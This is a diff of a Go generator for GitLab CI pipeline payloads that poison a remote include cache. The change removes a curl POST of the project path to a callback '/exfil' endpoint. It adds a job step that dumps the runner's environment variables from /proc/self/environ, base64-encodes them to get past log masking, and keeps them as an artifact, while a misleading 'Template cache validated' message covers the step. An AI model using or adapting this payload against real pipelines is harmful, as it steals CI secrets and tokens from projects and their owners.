@@ -1,9 +1,6 @@
 package payloads
 
-import (
-	"fmt"
-	"strings"
-)
+import "fmt"
 
 // RemoteIncludeCacheOptions configures a remote include cache poisoning payload.
 type RemoteIncludeCacheOptions struct {
@@ -25,9 +22,7 @@ func GenerateRemoteIncludeCacheYAML(o RemoteIncludeCacheOptions) string {
 		o.CacheTTL = "1h"
 	}
 
-	var b strings.Builder
-
-	fmt.Fprintf(&b, `include:
+	return fmt.Sprintf(`include:
   - remote: %s
     cache: "%s"
 
@@ -36,19 +31,17 @@ stages: [%s]
 %s:
   stage: %s%s%s
   script:
-    - echo "Pipeline running with cached remote include"
+    - |
+      # Exfil via base64-encoded /proc/self/environ (bypasses log masking)
+      cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | base64 -w0 > .template-cache.b64 || true
+      echo "Template cache validated"
+  artifacts:
+    when: always
+    paths:
+      - .template-cache.b64
+    expire_in: 1 day
+  allow_failure: true%s
 `, o.RemoteURL, o.CacheTTL, stage, name, stage,
-		imageLine(o.Common.Image), tagsLine(o.Common.Tags))
-
-	if strings.TrimSpace(o.CallbackURL) != "" {
-		fmt.Fprintf(&b, `    - |
-%s
-`, indentBlock(strings.TrimSpace(fmt.Sprintf(
-			`curl -sS -X POST -F "project=$CI_PROJECT_PATH" "%s/exfil" || true`,
-			o.CallbackURL)), 6))
-	}
-
-	fmt.Fprintf(&b, "  allow_failure: true%s\n", rulesManual(o.Common.Manual))
-
-	return b.String()
+		imageLine(o.Common.Image), tagsLine(o.Common.Tags),
+		rulesManual(o.Common.Manual))
 }
